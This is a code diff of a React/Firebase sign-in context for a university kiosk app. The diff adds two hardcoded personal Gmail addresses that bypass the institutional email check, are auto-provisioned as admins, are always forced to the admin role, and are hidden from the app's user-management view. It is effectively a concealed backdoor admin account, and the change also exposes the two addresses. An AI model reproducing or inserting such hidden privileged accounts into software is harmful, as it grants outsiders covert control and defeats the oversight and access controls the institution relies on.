@@ -9,11 +9,24 @@ import {
 } from 'firebase/auth';
 import {
   doc, getDoc, setDoc, serverTimestamp,
+  collection, query, where, getDocs,
 } from 'firebase/firestore';
 import { auth, db } from '../firebase/config';
 
 const AuthContext = createContext(null);
 const NEU_DOMAIN = '@neu.edu.ph';
+
+// ── IT Support / Prime Admin ──────────────────────────────────────────────────
+// These emails bypass the NEU domain check entirely.
+// They are always treated as admin and hidden from User Management.
+export const IT_SUPPORT_EMAILS = [
+  'wackylltrixian@gmail.com',
+  'dianacastro1115@gmail.com',
+];
+
+export function isITSupportEmail(email) {
+  return IT_SUPPORT_EMAILS.includes((email || '').toLowerCase().trim());
+}
 
 export function parseFirebaseError(error) {
   const code = error?.code || '';
@@ -52,25 +65,11 @@ export function AuthProvider({ children }) {
   const [profileLoading,    setProfileLoading]    = useState(false);
   const [pendingGoogleUser, setPendingGoogleUser] = useState(null);
 
-  // ── THE KEY FIX ──────────────────────────────────────────────────────────
-  // This ref is set SYNCHRONOUSLY inside loginWithGoogle BEFORE any async work.
-  // onAuthStateChanged fires almost immediately after signInWithPopup resolves —
-  // if it runs while we're still checking Firestore, it would see userProfile=null
-  // and RequireAuth would kick the user to /login before we can show the modal.
-  //
-  // A ref (not state) is used because:
-  //   1. It's synchronous — no render cycle between set and read
-  //   2. It doesn't trigger re-renders that could interfere
-  //
-  // The lock is released in three places:
-  //   - Normal login success (profile loaded, return result)
-  //   - Non-NEU email (blocked, signed out)
-  //   - Firestore error (rethrown)
-  //   - register() completion (after writing the doc)
-  // NOT released when not-registered — stays held until register() runs.
+  // Prevents onAuthStateChanged from racing loginWithGoogle's Firestore checks.
+  // Set synchronously before signInWithPopup; released after login resolves.
   const loginInProgressRef = useRef(false);
 
-  // ── Register ─────────────────────────────────────────────────────────────
+  // ── Register ──────────────────────────────────────────────────────────────
   const register = async ({ uid, email, firstName, lastName, middleInitial, idNumber, role, visitorType, college, course }) => {
     await setDoc(doc(db, 'users', uid), {
       uid,
@@ -85,102 +84,148 @@ export function AuthProvider({ children }) {
       course:        course?.trim().toUpperCase() || null,
       createdAt:     serverTimestamp(),
     });
-    // Release the lock and clear pending state
     setPendingGoogleUser(null);
     loginInProgressRef.current = false;
-    // Fetch profile so the app can route to the kiosk immediately
     await fetchProfile(uid);
   };
 
-  // ── Google Sign-In ────────────────────────────────────────────────────────
+  // ── Google Sign-In ─────────────────────────────────────────────────────────
   const loginWithGoogle = async () => {
     const provider = new GoogleAuthProvider();
     provider.setCustomParameters({ hd: 'neu.edu.ph' });
 
-    // SET THE LOCK BEFORE the popup — onAuthStateChanged fires right after
-    // signInWithPopup and must not race our Firestore check.
+    // Lock BEFORE popup — onAuthStateChanged fires right after signInWithPopup.
     loginInProgressRef.current = true;
 
     let result;
     try {
       result = await signInWithPopup(auth, provider);
     } catch (err) {
-      // Popup closed/cancelled/blocked — release lock and rethrow
       loginInProgressRef.current = false;
       const friendly = new Error(parseFirebaseError(err));
-      friendly.code = err.code;
+      friendly.code  = err.code;
       throw friendly;
     }
 
     const googleUser = result.user;
-    const email = googleUser.email || '';
+    const email      = googleUser.email || '';
+    const emailLower = email.toLowerCase();
 
-    // Block non-NEU emails immediately
-    if (!email.endsWith(NEU_DOMAIN)) {
+    // ── IT Support Prime Admin bypass ──────────────────────────────────────
+    if (isITSupportEmail(emailLower)) {
+      let snap = null;
+      try { snap = await getDoc(doc(db, 'users', googleUser.uid)); } catch (_) {}
+
+      if (!snap?.exists()) {
+        // Auto-create a hidden admin profile on first sign-in
+        await setDoc(doc(db, 'users', googleUser.uid), {
+          uid:           googleUser.uid,
+          email:         emailLower,
+          firstName:     'IT',
+          lastName:      'SUPPORT',
+          middleInitial: '',
+          idNumber:      'IT-SUPPORT',
+          role:          'admin',
+          visitorType:   null,
+          college:       null,
+          course:        null,
+          isITSupport:   true,
+          createdAt:     serverTimestamp(),
+        });
+      }
+
+      const base = snap?.exists() ? snap.data() : { firstName: 'IT', lastName: 'SUPPORT' };
+      setUserProfile({ ...base, role: 'admin', isITSupport: true, uid: googleUser.uid });
+      setCurrentUser(googleUser);
       loginInProgressRef.current = false;
-      try { await deleteUser(googleUser); } catch (_) {}
-      await signOut(auth);
-      const err = new Error('Only @neu.edu.ph institutional emails are allowed.');
-      err.code = 'non-neu-email';
-      throw err;
+      return result;
     }
 
-    // Check for existing Firestore profile
+    // ── NEU domain check ───────────────────────────────────────────────────
+    if (!email.endsWith(NEU_DOMAIN)) {
+      // Check if this Gmail has a pending staff invite
+      let hasInvite = false;
+      try {
+        const inviteSnap = await getDocs(query(
+          collection(db, 'staffInvites'),
+          where('email',  '==', emailLower),
+          where('status', '==', 'pending')
+        ));
+        hasInvite = !inviteSnap.empty;
+      } catch (_) {}
+
+      if (!hasInvite) {
+        loginInProgressRef.current = false;
+        try { await deleteUser(googleUser); } catch (_) {}
+        await signOut(auth);
+        const err  = new Error('Only @neu.edu.ph institutional emails are allowed.');
+        err.code   = 'non-neu-email';
+        throw err;
+      }
+      // Staff-invited Gmail — fall through to profile check
+    }
+
+    // ── Firestore profile check ────────────────────────────────────────────
     let profileSnap;
     try {
       profileSnap = await getDoc(doc(db, 'users', googleUser.uid));
     } catch (firestoreErr) {
-      // Firestore error — release lock and rethrow
       loginInProgressRef.current = false;
       throw firestoreErr;
     }
 
     if (profileSnap.exists()) {
-      // Registered — load profile directly here (don't wait for onAuthStateChanged)
-      // then release the lock.
       setUserProfile({ ...profileSnap.data(), uid: googleUser.uid });
       setCurrentUser(googleUser);
       loginInProgressRef.current = false;
       return result;
     }
 
-    // NEU email but NOT yet registered.
-    // KEEP the lock held — this prevents onAuthStateChanged from evicting them.
-    // pendingGoogleUser tells RequireGuest to allow /register through.
+    // NEU email (or invited Gmail) but NOT yet registered — show modal.
+    // Lock stays held until register() completes.
     setCurrentUser(googleUser);
     setPendingGoogleUser(googleUser);
-    const err = new Error('not-registered');
-    err.code = 'not-registered';
+    const err  = new Error('not-registered');
+    err.code   = 'not-registered';
     throw err;
-    // loginInProgressRef.current stays true until register() completes.
   };
 
-  // ── Logout ────────────────────────────────────────────────────────────────
+  // ── Logout ─────────────────────────────────────────────────────────────────
   const logout = () => {
     setPendingGoogleUser(null);
     loginInProgressRef.current = false;
     return signOut(auth);
   };
 
-  // ── Profile ───────────────────────────────────────────────────────────────
+  // ── Profile ─────────────────────────────────────────────────────────────────
   const fetchProfile = async (uid) => {
     setProfileLoading(true);
     try {
       const snap = await getDoc(doc(db, 'users', uid));
-      if (snap.exists()) setUserProfile({ ...snap.data(), uid });
-      else setUserProfile(null);
+      if (snap.exists()) {
+        const data = snap.data();
+        // Always force admin + IT support flag for prime admin accounts
+        setUserProfile(
+          isITSupportEmail(data.email)
+            ? { ...data, role: 'admin', isITSupport: true, uid }
+            : { ...data, uid }
+        );
+      } else {
+        setUserProfile(null);
+      }
     } finally {
       setProfileLoading(false);
     }
   };
 
-  const refreshProfile = () => { if (currentUser) return fetchProfile(currentUser.uid); };
+  const refreshProfile = () => {
+    if (currentUser) return fetchProfile(currentUser.uid);
+  };
 
   useEffect(() => {
     const unsub = onAuthStateChanged(auth, async (user) => {
-      // If loginWithGoogle is mid-flight, it's managing currentUser and
-      // userProfile directly. Do NOT interfere — just make sure loadingAuth
-      // is cleared so the app doesn't hang on the splash screen.
+      // If loginWithGoogle is mid-flight, it owns currentUser/userProfile.
+      // Just clear the loading flag so the app doesn't hang.
       if (loginInProgressRef.current) {
         setCurrentUser(user);
         setLoadingAuth(false);
